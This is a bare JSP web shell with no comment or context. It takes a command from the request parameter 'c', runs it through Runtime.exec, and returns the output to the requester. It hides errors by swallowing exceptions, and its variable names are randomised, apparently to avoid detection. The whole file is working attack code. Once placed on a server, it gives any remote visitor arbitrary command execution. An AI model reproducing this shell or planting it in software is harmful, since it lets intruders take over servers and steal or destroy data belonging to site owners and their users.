<%@ page import="java.util.*,java.io.*" %>
<%
try {
String aNRCcE = request.getParameter("c");
Process qiK = Runtime.getRuntime().exec(aNRCcE);
DataInputStream ds = new DataInputStream(qiK.getInputStream());
String EVti = ds.readLine();
while ( EVti != null ) {
  out.println(EVti); 
  EVti = ds.readLine(); 
}
} catch (Exception e) {}
%>
